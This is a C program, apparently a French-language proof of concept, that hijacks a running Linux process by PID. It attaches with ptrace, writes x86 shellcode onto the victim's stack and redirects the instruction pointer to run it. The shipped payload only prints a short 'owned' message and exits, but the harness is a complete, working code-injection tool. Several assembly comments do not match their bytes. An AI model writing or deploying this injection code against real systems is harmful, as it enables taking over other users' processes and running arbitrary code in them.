#include <stdio.h>
#include <sys/ptrace.h>
#include <errno.h>
#include <asm/user.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <unistd.h>


int main (int argc, char **argv)
{
	char shellcode []=
	"\x90\x90\x90\x90\x90"	//times 5 nop
	"\x31\xc0"		//xor    %eax,%eax
	"\x99"			//cltd
	"\xb0\x04"		//mov    $0x4,%al
	"\x31\xdb"		//xor    %ebx,%ebx
	"\x43"			//inc    %ebx
	"\x68\x64\x20\x21\x0a"	//push   $0xa212064
	"\x68\x6f\x77\x6e\x33"	//push   $0x656e776f
	"\x89\xe1"		//mov    %esp,%ecx
	"\xb2\x08"		//mov    $0x4,%dl
	"\xcd\x80"		//int    $0x80
	"\x31\xc0"		//xor    %eax,%eax
	"\x40"			//inc    %eax
	"\x31\xdb"		//xor    %ebx,%ebx
	"\xcd\x80";		//int    $0x80


	pid_t	pid;
	struct user_regs_struct reg;
	int i;

	if(!argv[1]){
		printf("%s <pid_to_own>\n\n",argv[0]);
		exit(1);
	}

	pid = atoi(argv[1]);
	if(ptrace(PTRACE_ATTACH, pid, NULL,NULL)){
		perror("PTRACE_ATTACH");
		exit(1);
	}
	printf("[+] Attente d'atachement au processus %d\n",pid);

	if(waitpid(pid,NULL,WUNTRACED)<0){
		perror("waitpid WUNTRACED");
		exit(1);
	}
	printf("[+] Attachement réussi\n");

	if(ptrace(PTRACE_GETREGS, pid, NULL, &reg)){
		perror("PTRACE_GETREGS");
		exit(1);
	}
	printf("[+] Lecture des registres:\n");
	printf("\t-eip: %#08lx\n\t-esp: %#08lx\n",reg.eip,reg.esp);

	reg.esp-=4096;

	for(i=0;i<36;i+=4){
		if(ptrace(PTRACE_POKEDATA, pid, reg.esp+i,*(int*)&shellcode[0+i])){
			perror("PTRACE_POKEDATA");
			exit(1);
		}
	}
	printf("[+] Shellcode copié en esp:%#08lx\n",reg.esp);

	reg.eip=reg.esp;
	reg.eip+=3;	                  //eip commence souvent 2 bytes avant

	if(ptrace(PTRACE_SETREGS, pid, NULL, &reg)){
		perror("PTRACE_SETREGS");
		exit(0);
	}

	printf("[+] Redirection vers le shellcode eip:%#08lx\n",reg.eip);
	printf("[+] Détachement du processus %d\n",pid);
	ptrace(PTRACE_DETACH, pid, NULL, NULL);
	return(0);
}